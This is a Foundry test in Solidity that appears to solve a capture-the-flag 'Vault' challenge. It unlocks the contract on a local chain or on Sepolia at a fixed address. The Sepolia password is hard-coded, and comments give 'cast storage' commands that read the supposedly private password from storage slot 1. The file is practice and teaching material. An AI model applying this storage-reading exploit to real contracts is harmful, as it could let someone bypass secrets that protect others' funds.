// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

interface IVault {
    function locked() external view returns (bool);
    function unlock(bytes32 _password) external;
}

contract ValutExp is Test {
    IVault public contractInstance;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    bytes32 password = bytes32("password"); // The password to unlock the vault

    function setUp() public {
        // uint256   sepoliaFork = vm.createSelectFork("sepolia");
        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);
        uint256 chainId = block.chainid;
        console2.log("Chain ID:", chainId);
        if (chainId == 31337) {
            vm.startPrank(deployer);
            contractInstance = IVault(address(new Vault(password)));
            vm.stopPrank();
        } else if (chainId == 11155111) {
            password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
            contractInstance = IVault(payable(0x5ec06906FfE4e5c3657dE4e9F33542Ba076726a4));
        } else {
            return;
        }
    }

    // forge test --mt testUnlokeVault -vvvv
    // forge test --mt testUnlokeVault --fork-url $SEPOLIA_RPC_URL -vvvvv
    // forge inspect src/Vault.sol storage
    // cast storage 0x5ec06906FfE4e5c3657dE4e9F33542Ba076726a4 1 --rpc-url $SEPOLIA_RPC_URL //password
    // cast storage 0x5ec06906FfE4e5c3657dE4e9F33542Ba076726a4 0 --rpc-url $SEPOLIA_RPC_URL //locked
    function testUnlokeVault() public {
        console2.log("Running in testUnlokeVault...");
        vm.startPrank(attacker); // Set msg.sender to the attacker address
        contractInstance.unlock(password); // Call the unlock function with the password
        bool isLocked = contractInstance.locked(); // Check if the vault is still locked
        assertEq(isLocked, false, "Vault should be unlocked");
        vm.stopPrank();
    }
}
